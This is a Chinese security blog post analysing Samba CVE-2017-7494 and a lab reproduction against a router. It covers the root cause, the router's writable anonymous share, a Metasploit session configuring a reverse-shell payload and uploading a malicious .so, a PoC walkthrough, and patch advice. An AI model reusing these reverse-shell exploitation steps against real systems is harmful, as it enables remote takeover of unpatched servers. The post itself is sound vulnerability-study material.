---
title: 某厂商路由器与Samba漏洞CVE-2017-7494
date: 2019-03-25 13:45:16
tags:
- Samba
- 远程执行
- CVE
categories:
- IOT
---

# 漏洞描述
Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。
具体执行条件如下：

1. 服务器打开了文件/打印机共享端口445，让其能够在公网上访问

2. 共享文件拥有写入权限

3. 恶意攻击者需猜解Samba服务端共享目录的物理路径

# Samba介绍
Samba是在Linux和Unix系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。

SMB协议是客户机/服务器型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。通过设置“NetBIOS over TCP/IP”使得Samba不但能与局域网络主机分享资源，还能与全世界的电脑分享资源。

某厂商路由器的smbd版本为4.0.21，该漏洞影响Samba 3.5.0到4.6.4/4.5.10/4.4.14的中间版本。

# 漏洞成因
处于``\source3\rpc_server\src_pipe.c的is_known_pipename()``函数未对传进来的管道名`pipename`的路径分隔符`/`进行识别过滤，导致可以用绝对路径调用恶意的so文件，从而远程任意代码执行。
首先看到`is_known_pipename()``函数
![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-00-46.png)

跟进到`smb_probe_module()`
![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-59-58.jpg)

再跟进到`do_smb_load_module()`，发现调用的过程就在其中,调用了传进来的moudule_name对应的init_samba_module函数
![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-01-19.jpg)

我们可以通过smb服务上传一个恶意的so文件，随后通过上述过程进行调用，执行任意代码。


# 漏洞复现
## 某路由器满足条件
```
netstat -apnt
tcp    0   0 192.168.31.1:445   0.0.0.0:*     LISTEN   0 572 1917/smbd

nmap 192.168.31.1
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
```
***端口已开启***
```
vim /etc/samba/smb.conf
        deadtime = 30
        domain master = yes
        encrypt passwords = true
        enable core files = no
        guest account = nobody
        guest ok = yes
        invalid users =
        local master = yes
        load printers = no
        map to guest = Bad User
        min receivefile size = 16384
        null passwords = yes
        obey pam restrictions = yes
        passdb backend = smbpasswd
        preferred master = yes
        printable = no
        smb encrypt = disabled
        smb passwd file = /etc/samba/smbpasswd
        socket options =  SO_SNDBUFFORCE=1048576 SO_RCVBUFFORCE=1048576
        smb2 max trans = 1048576
        smb2 max write = 1048576
        smb2 max read = 1048576
        write cache size = 262144
        syslog = 2
        syslog only = yes
        use sendfile = yes
        writeable = yes
        log level = 1
        unicode = True
        max log size = 500
        log file = /tmp/log/samba.log
        server role = STANDALONE

[homes]
        comment     = Home Directories
        browsable   = no
        read only   = no
        create mode = 0750

[data]                    ***SMB_SHARE_NAME***
        path = /tmp       ***SMB_FOLDER***
        read only = no    ***具备可写权限***
        guest ok = yes    ***允许匿名***
        create mask = 0777
        directory mask = 0777
```
***具有可写权限、目录为/tmp***

## 攻击：使用metasploit
### 设置攻击参数
靶机是某厂商路由器，它的系统为mips架构，但是这个库好像对它的支持不是很好
```
show options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS          192.168.31.1     yes       The target address range or CIDR identifier
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.216.129  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   7   Linux MIPSLE
```
### 执行攻击
```
exploit

[*] Started reverse TCP handler on 192.168.216.129:4444
[*] 192.168.31.1:445 - Using location \\192.168.31.1\data\ for the path
[*] 192.168.31.1:445 - Retrieving the remote path of the share 'data'
[*] 192.168.31.1:445 - Share 'data' has server-side path '/tmp
[*] 192.168.31.1:445 - Uploaded payload to \\192.168.31.1\data\KcQiOcbk.so
[*] 192.168.31.1:445 - Loading the payload from server-side path /tmp/KcQiOcbk.so using \\PIPE\/tmp/KcQiOcbk.so...
[-] 192.168.31.1:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.168.31.1:445 - Loading the payload from server-side path /tmp/KcQiOcbk.so using /tmp/KcQiOcbk.so...
[-] 192.168.31.1:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] Exploit completed, but no session was created.
```
虽然报错，但是查看共享文件夹/tmp却发现了生成了.so文件
知乎这篇[专栏](https://zhuanlan.zhihu.com/p/27129229)也有相同问题


# 修补方案

最安全的方法还是打补丁或者升级到Samba 4.6.4/4.5.10/4.4.14任意版本，可以参考 https://www.samba.org/samba/history/security.html

如果暂时不能升级版本或安装补丁，可以使用临时解决方案：
在smb.conf的[global]板块中添加参数：nt pipe support = no
然后重启smbd服务。

# 分析POC，查找原因
(来自[Wz'blog](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/))

## 建立SMB连接。若需要账号密码登录，则必须登录后才能继续
从微软上扒的SMB协议建立时序图：
![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-09-40.png)

对应POC:

![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/23-15-57.png)

## 利用NetShareEnumAll遍历目标服务器的共享名(ShareName)以及获取对应的共享文件夹下的可写路径(Path)
![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-38-48.jpg)

其中find_writeable_path()函数需要跟进看一下：
![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-14-43.jpg)

再跟进看enumerate_directories()以及verify_writeable_directory函数
![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-48-27.jpg)
![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-18-44.jpg)

可以看到代码逻辑很清楚，首先遍历出当前路径所有的文件夹，然后尝试往里面写一个随机的txt文件用作可写测试，随后删除掉txt文件，记录下可写的文件路径。
至此，我们得到了一个共享名(即本例中的data)以及其当前路径下的可写目录(/tmp)

## 利用NetShareGetInfo获取共享文件夹的绝对路径(SharePath)
![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-26-47.jpg)
至此获取到了共享名data的绝对路径。
值得注意的是，这里跟早期的Payload不一样，早期的payload是靠暴力猜解目录，所以跟一些分析文章有些出入。现在的Payload是根据NetShareGetInfo直接获取到准确的路径，极大地提高了攻击的成功率。

## 上传恶意so文件
![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-38-28.jpg)
其中写入的so文件是Metasploit生成的反弹shell，很简单的执行一句命令。有一点需要注意的是里面的函数名必须是samba_init_module并且是一个导出函数，这个原因上述的漏洞分析也有提及。

## 调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功
![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-43-02.jpg)
利用从第2步获取到的可写文件目录(Path)以及从第3步得到的共享文件绝对路径(SharePath)构造恶意管道名\\PIPE\/SharePath/Path/Evil.so，然后通过SMB_COM_NT_CREATE_ANDX进行调用。
在复现时，调用恶意so文件总会失败，产生Error Code为：STATUS_OBJECT_NAME_NOT_FOUND的错误。尚未能明白为什么会出现这种首次失败的情况，也许要详细看看smb协议才能知道了。
POC代码将STATUS_OBJECT_PATH_INVALID作为我们payload被加载的标志，随后就是用NBSS协议进行了一次远程代码执行的测试，执行代码为echo随机字符串。

## 删除恶意so文件，断开smb连接
![](https://www.testzero-wz.com/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-45-01.png)

由msf给出的poc过程可见，对路由器的攻击在第五步出现问题，因此出现Failed to load STATUS_OBJECT_NAME_NOT_FOUND
